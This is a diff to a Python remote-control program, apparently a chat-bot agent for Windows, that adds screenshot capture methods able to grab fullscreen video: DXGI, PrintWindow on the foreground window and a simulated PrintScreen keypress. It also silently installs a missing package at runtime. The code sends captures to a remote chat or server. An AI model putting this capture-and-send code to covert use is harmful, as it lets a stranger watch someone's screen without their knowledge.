@@ -915,31 +915,182 @@ def send_result(chat_id, text=None, photo_path=None, msg_id=None, proc_list=None
     except Exception as e:
         print(f"[-] Error sending result to server: {e}")
 
+def _is_mostly_black(image_path, sample_step=36, black_threshold=18, black_ratio=0.92):
+    """True if capture looks empty (typical GPU overlay / exclusive fullscreen miss)."""
+    try:
+        from PIL import Image
+        img = Image.open(image_path).convert('RGB')
+        w, h = img.size
+        if w < 2 or h < 2:
+            return True
+        pixels = img.load()
+        total = 0
+        black = 0
+        for y in range(0, h, sample_step):
+            for x in range(0, w, sample_step):
+                r, g, b = pixels[x, y]
+                total += 1
+                if r <= black_threshold and g <= black_threshold and b <= black_threshold:
+                    black += 1
+        return total > 0 and (black / float(total)) >= black_ratio
+    except Exception:
+        return True
+
+def _screenshot_file_ok(path):
+    return os.path.exists(path) and os.path.getsize(path) > 256 and not _is_mostly_black(path)
+
+def _screenshot_dxcam(path):
+    """DXGI Desktop Duplication — sees DWM-composited video (borderless/windowed fullscreen)."""
+    try:
+        try:
+            dxcam = __import__('dxcam')
+        except ImportError:
+            print("[*] Installing missing package: dxcam...")
+            subprocess.check_call([sys.executable, "-m", "pip", "install", "dxcam"])
+            dxcam = __import__('dxcam')
+
+        camera = dxcam.create(output_idx=0, output_color="RGB")
+        if camera is None:
+            return False
+        frame = camera.grab()
+        if frame is None:
+            time.sleep(0.08)
+            frame = camera.grab()
+        try:
+            camera.release()
+        except Exception:
+            pass
+        if frame is None:
+            return False
+        from PIL import Image
+        Image.fromarray(frame).save(path, "PNG")
+        return _screenshot_file_ok(path)
+    except Exception as e:
+        print(f"[-] dxcam screenshot failed: {e}")
+        return False
+
+def _screenshot_printwindow(path):
+    """PrintWindow + PW_RENDERFULLCONTENT captures hardware-accelerated window content."""
+    try:
+        import win32gui
+        import win32ui
+        from PIL import Image
+
+        hwnd = user32.GetForegroundWindow()
+        if not hwnd or not user32.IsWindow(hwnd):
+            hwnd = user32.GetDesktopWindow()
+
+        left, top, right, bottom = win32gui.GetWindowRect(hwnd)
+        width = max(1, right - left)
+        height = max(1, bottom - top)
+        if width < 64 or height < 64:
+            hwnd = user32.GetDesktopWindow()
+            left, top, right, bottom = win32gui.GetWindowRect(hwnd)
+            width = max(1, right - left)
+            height = max(1, bottom - top)
+
+        hwnd_dc = win32gui.GetWindowDC(hwnd)
+        mfc_dc = win32ui.CreateDCFromHandle(hwnd_dc)
+        save_dc = mfc_dc.CreateCompatibleDC()
+        bitmap = win32ui.CreateBitmap()
+        bitmap.CreateCompatibleBitmap(mfc_dc, width, height)
+        save_dc.SelectObject(bitmap)
+
+        PW_RENDERFULLCONTENT = 0x00000002
+        ok = user32.PrintWindow(hwnd, save_dc.GetSafeHdc(), PW_RENDERFULLCONTENT)
+        if not ok:
+            ok = user32.PrintWindow(hwnd, save_dc.GetSafeHdc(), 0)
+        if not ok:
+            raise RuntimeError("PrintWindow returned 0")
+
+        bmpinfo = bitmap.GetInfo()
+        bmpstr = bitmap.GetBitmapBits(True)
+        img = Image.frombuffer(
+            "RGB",
+            (bmpinfo["bmWidth"], bmpinfo["bmHeight"]),
+            bmpstr,
+            "raw",
+            "BGRX",
+            0,
+            1,
+        )
+        img.save(path, "PNG")
+
+        win32gui.DeleteObject(bitmap.GetHandle())
+        save_dc.DeleteDC()
+        mfc_dc.DeleteDC()
+        win32gui.ReleaseDC(hwnd, hwnd_dc)
+        return _screenshot_file_ok(path)
+    except Exception as e:
+        print(f"[-] PrintWindow screenshot failed: {e}")
+        return False
+
+def _screenshot_printscreen(path):
+    """OS PrintScreen copies the composed desktop into the clipboard."""
+    try:
+        from PIL import Image
+
+        VK_SNAPSHOT = 0x2C
+        user32.keybd_event(VK_SNAPSHOT, 0, 0, 0)
+        time.sleep(0.03)
+        user32.keybd_event(VK_SNAPSHOT, 0, KEYEVENTF_KEYUP, 0)
+        time.sleep(0.28)
+        img = ImageGrab.grabclipboard()
+        if img is None:
+            time.sleep(0.35)
+            img = ImageGrab.grabclipboard()
+        if not isinstance(img, Image.Image):
+            return False
+        img.save(path, "PNG")
+        return _screenshot_file_ok(path)
+    except Exception as e:
+        print(f"[-] PrintScreen screenshot failed: {e}")
+        return False
+
 def take_screenshot():
     import tempfile
-    screenshot_path = os.path.join(tempfile.gettempdir(), 'rony_temp_screenshot.png')
+    screenshot_path = os.path.join(tempfile.gettempdir(), "rony_temp_screenshot.png")
 
-    # 1. Primary Method: mss (highly reliable, supports all screens)
+    # GPU/video-aware methods first: GDI (mss/PIL) sees a black frame on fullscreen movies.
+    methods = (
+        ("dxcam/DXGI", _screenshot_dxcam),
+        ("PrintWindow", _screenshot_printwindow),
+        ("PrintScreen", _screenshot_printscreen),
+    )
+    for name, fn in methods:
+        try:
+            if fn(screenshot_path):
+                print(f"[+] Screenshot captured via {name}")
+                return screenshot_path
+        except Exception as e:
+            print(f"[-] {name} screenshot failed: {e}")
+
+    # 4. GDI fallback: mss (all monitors)
     try:
         import mss
         with mss.mss() as sct:
-            sct.shot(mon=-1, output=screenshot_path) # mon=-1 captures all monitors
-            if os.path.exists(screenshot_path) and os.path.getsize(screenshot_path) > 0:
-                # Need to convert to standard format occasionally, but mss saves as valid PNG.
+            mon = sct.monitors[0] if len(sct.monitors) > 0 else sct.monitors[1]
+            sct_img = sct.grab(mon)
+            mss.tools.to_png(sct_img.rgb, sct_img.size, output=screenshot_path)
+            if _screenshot_file_ok(screenshot_path):
+                print("[+] Screenshot captured via mss")
                 return screenshot_path
+            print("[-] mss screenshot looks black (GPU overlay)")
     except Exception as e:
         print(f"[-] mss screenshot failed: {e}")
 
-    # 2. Secondary Method: PIL ImageGrab
+    # 5. PIL ImageGrab
     try:
         img = ImageGrab.grab(all_screens=True)
         img.save(screenshot_path)
-        if os.path.exists(screenshot_path) and os.path.getsize(screenshot_path) > 0:
+        if _screenshot_file_ok(screenshot_path):
+            print("[+] Screenshot captured via PIL")
             return screenshot_path
+        print("[-] PIL screenshot looks black (GPU overlay)")
     except Exception as e:
         print(f"[-] PIL screenshot failed: {e}")
 
-    # 3. Fallback Method: PowerShell
+    # 6. PowerShell CopyFromScreen
     try:
         ps_script = f"""
         Add-Type -AssemblyName System.Windows.Forms
@@ -953,11 +1104,16 @@ def take_screenshot():
         $bitmap.Dispose()
         """
         subprocess.run(["powershell", "-Command", ps_script], capture_output=True)
-        if os.path.exists(screenshot_path) and os.path.getsize(screenshot_path) > 0:
+        if _screenshot_file_ok(screenshot_path):
+            print("[+] Screenshot captured via PowerShell")
             return screenshot_path
+        print("[-] PowerShell screenshot looks black (GPU overlay)")
     except Exception as e:
         print(f"[-] PowerShell screenshot failed: {e}")
 
+    # Last resort: return whatever file exists, even if dark
+    if os.path.exists(screenshot_path) and os.path.getsize(screenshot_path) > 0:
+        return screenshot_path
     return None
 
 def set_brightness(level):
